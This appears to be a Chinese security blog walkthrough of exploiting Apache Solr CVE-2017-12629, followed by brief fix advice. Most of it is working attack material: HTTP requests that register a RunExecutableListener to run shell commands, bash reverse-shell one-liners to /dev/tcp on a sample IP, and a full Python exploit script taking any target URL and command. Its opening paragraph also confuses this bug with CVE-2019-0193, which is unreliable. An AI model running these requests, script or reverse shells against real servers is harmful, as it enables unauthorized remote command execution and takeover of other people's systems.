# Apache Solr 远程命令执行漏洞（CVE-2017-12629）

**2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。此次漏洞出现在Apache**
**Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。**

# 影响版本

```
Apache Solr 5.5.0到7.0.1版本
```



# 特征

**访问`8983`端口即可查看到`Apache solr`的管理页面，`无需登录`。（可能换端口）**
**网站title是`Solr Admin`，图标有点像一朵`红色的花`**

![img](https://img-blog.csdnimg.cn/70a0df95fbaa4ab0a913a65fd7520b0d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

# 漏洞利用

**此次7.1.0之前版本总共爆出两个漏洞：[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。**

https://paper.seebug.org/425/

**访问/solr/demo/config进行抓包**

**首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：**

```
POST /solr/demo/config HTTP/1.1
Host: your-ip  （修改为对应的IP）
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

![img](https://img-blog.csdnimg.cn/16f8b56b59c84102b56f6c9808a284c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

**一个listener只能创建一次，所以用一次改一次**

**update触发listener，是触发所有listener！，所以之前已经存在的listener也会触发！listener不能创建太多了，不然会奔溃**



**我们再来试试重复用name值，会怎样？**
**可以看到重复使用name值，就直接报错，无法成功创建listener！**

![img](https://img-blog.csdnimg.cn/a9ff5f7fe30448098de32f6d4d293e07.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

**然后进行update操作，触发刚才添加的listener：**
**这个包触发所有存在的listener！**

```
POST /solr/demo/update HTTP/1.1
Host: your-ip(自行修改IP)
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

![image-20220704214424341](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704214424341.png)

**成功执行、进行验证，可以看到成功创建/tmp/success下的文件**

![image-20220704214545187](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704214545187.png)





# 反弹shell

服务器NC监听

![img](https://img-blog.csdnimg.cn/6255cc75354c4aa3aad7b067de86a309.png)

**然后创建listener。改name的值（任意修改），换成自己想执行的命令**

```bash
bash -i >& /dev/tcp/xx/xxx 0>&1
```

**Tips:**

```bash
1.0、
双方都是bash
使用bash -i >& /dev/tcp/192.168.100.34/9090 0>&1
可以反弹
1.1、
双方都是sh
使用sh -i >& /dev/udp/192.168.100.34/1111 0>&1
无法反弹
1.2、
双方都是/bin/bash
使用/bin/bash -i > /dev/tcp/192.168.100.34/1111 0<& 2>&1
无法反弹
```

**Tips：**

**linux一般默认都是用的bash，但是我们的数据包是sh，而我们的反弹命令又是用的bash，所以要想反弹的话，必须把包中的sh改成bash。之前用sh也可以执行命令，是因为之前的命令既属于sh也属于bash**

![image-20220704215936797](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704215936797.png)

![img](https://img-blog.csdnimg.cn/3dff4b100de646d7880579f3f7499ecc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

![image-20220704220036126](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704220036126.png)

**成功反弹**

![image-20220704220049958](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704220049958.png)



# 漏洞EXP

项目地址：https://github.com/zhzyker/exphub/blob/master/[solr](https://so.csdn.net/so/search?q=solr&spm=1001.2101.3001.7020)/cve-2017-12629_cmd.py

附代码：

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub
# telegram:t.me/zhzyker

import requests
import sys
import json

if len(sys.argv)!=4:
    print('+--------------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                     +')
    print('+      Apache Solr Commons Remote Code Execution                           +')
    print('+--------------------------------------------------------------------------+')
    print('+ USE: python3 cve-2017-12629_cmd.py <url> <listener_name> <cmd>           +')
    print('+ EXP: python3 cve-2017-12629_cmd.py http://ip:8983 name "touch /tmp/123"  +')
    print('+ VER: Apache Solr < 7.1.0                                                 +')
    print('+--------------------------------------------------------------------------+')
    sys.exit(0)

url = sys.argv[1]
listener = sys.argv[2]
cmd = sys.argv[3]


#get core name
core_url = url + "/solr/admin/cores?indexInfo=false&wt=json"
try:
    r = requests.request("GET", url=core_url, timeout=20)
    core_name = list(json.loads(r.text)["status"])[0]
    print ("[+] GET CORE NAME: "+url+"/solr/"+core_name+"/config")
except:
    print ("[-] Target Not Vuln Good Luck")
    sys.exit(0)
    
cmd_url = url + "/solr/" +core_name+ "/config"
exec_url = url + "/solr/" +core_name+ "/update"
#print (cmd_url)
#print (exec_url)
    
headers_cmd = {
    'Host': "localhost",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Content-Length': "160"
    }
   
headers_exec = {
    'Host': "localhost",
    'ccept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Content-Type': "application/json",
    'Content-Length': "15"
    } 


payload_cmd = """
{"add-listener":{"event":"postCommit","name":"%s","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "%s"]}}
""" % (listener,cmd)

payload_exec = """
[{"id":"test"}]
"""

r = requests.request("POST", url=cmd_url, data=payload_cmd, headers=headers_cmd, timeout=30)
a = list(json.loads(r.text))[1]
if "errorMessages" in a:
    print ("[-] Listener Repeat")
    sys.exit(0)

r = requests.request("POST", url=exec_url, data=payload_exec, headers=headers_exec, timeout=30)
if r.status_code == 200:
    print ("[+] Command Executed Successfully (Effective about one minute) (No Echo)")
else:
    print ("[-] Command Executed Failed")
```

使用格式：`python3 filename.py url name command`

![img](https://img-blog.csdnimg.cn/3d9dc045fdd24c90829b26b4d35af09c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

**tips：name就是前面流程中的name的值，所以每次必须不一样！**

成功执行！

![img](https://img-blog.csdnimg.cn/53a111eb4f314569b0a1067c298950a9.png)



**反弹shell也是一样的操作，修改需要执行的命令即可**

![image-20220704221814999](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704221814999.png)

成功反弹shell

![image-20220704221830357](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220704221830357.png)



# 总结

**1、linux一般默认都是用的bash，但是我们的包是sh，而我们的反弹命令又是用的bash，所以要想反弹的话，必须把包中的sh改成bash。之前用sh也可以执行命令，是因为之前的命令既属于sh也属于bash！**
**2、java的runtime函数才需要编码，这里用的是solr.RunExecutableListener函数**

![img](https://img-blog.csdnimg.cn/7afc3248e2e6411b926475f80e64e0c4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5qix5rWF5rKQ5Yaw,size_20,color_FFFFFF,t_70,g_se,x_16)

**3、（也就是说双方的命令语言要一样！）**
**双方都是bash**
**使用bash -i >& /dev/tcp/192.168.100.34/1111 0>&1**
**可以反弹**

# 漏洞修复

**1、添加Solr访问控制，包括禁止本地直接未授权访问；**
**2、升级版本至7.1，该版本已经解决了XML解析问题并删除了RunExecutableListener类；**
**3、针对XXE可手动修改CoreParser.java文件，按照通常防止基于DOM解析产生XXE的防范方法修复即可；**







[传送门](https://blog.csdn.net/qq_45300786/article/details/120303179?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165693866116782389447209%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165693866116782389447209&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-4-120303179-null-null.142^v30^pc_rank_34,185^v2^control&utm_term=Apache+Solr+%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89&spm=1018.2226.3001.4187)